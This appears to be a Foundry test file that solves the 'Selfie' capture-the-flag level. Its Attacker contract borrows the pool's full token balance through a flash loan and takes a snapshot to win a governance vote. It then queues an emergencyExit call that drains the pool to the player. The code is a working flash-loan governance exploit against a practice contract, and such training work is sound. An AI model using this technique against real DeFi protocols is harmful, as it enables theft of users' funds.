// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/selfie/SelfieLevel.sol";

interface ISelfiePool is IERC3156FlashLender {
  function emergencyExit(address) external;
}

contract Attacker is IERC3156FlashBorrower {
  SelfieLevel level;
  ISelfiePool pool;
  IERC20 token;
  DamnValuableTokenSnapshot governanceToken;
  ISimpleGovernance governance;
  address player;

  constructor(SelfieLevel _level) {
    level = _level;
    pool = ISelfiePool(address(level.pool()));
    token = IERC20(address(level.token()));
    governanceToken = DamnValuableTokenSnapshot(address(level.token()));
    governance = ISimpleGovernance(level.governance());
    player = msg.sender;
  }

  function setPayload() public {
    // get the loan, deliver the payload at onFlashLoan().
    pool.flashLoan(
      IERC3156FlashBorrower(this),
      address(token),
      pool.maxFlashLoan(address(token)),
      "0x"
    );
  }

  function attack() public {
    // IRL we would obtain this id parameter by inspecting
    // the log of the ActionQueued event.
    governance.executeAction(1);
  }

  function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
    // since this implements DamnValuableTokenSnapshot,
    // we can just issue a snapshot.
    // as we were able to borrow the maximum of the pool,
    // we will get the majority of the votes.
    governanceToken.snapshot();

    // prepare the payload
    bytes memory data = abi.encodeWithSelector(
      ISelfiePool.emergencyExit.selector,
      player
    );

    // deliver the payload
    governance.queueAction(
      address(pool),
      0,
      data
    );

    // return the funds
    token.approve(msg.sender, amount);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
  }
}

contract SelfieTest is Test {
  SelfieLevel level = new SelfieLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    Attacker attacker = new Attacker(level);
    attacker.setPayload();
    // advance time 2 days
    vm.warp(block.timestamp + 2 days);
    attacker.attack();

    level.validate();
  }
}
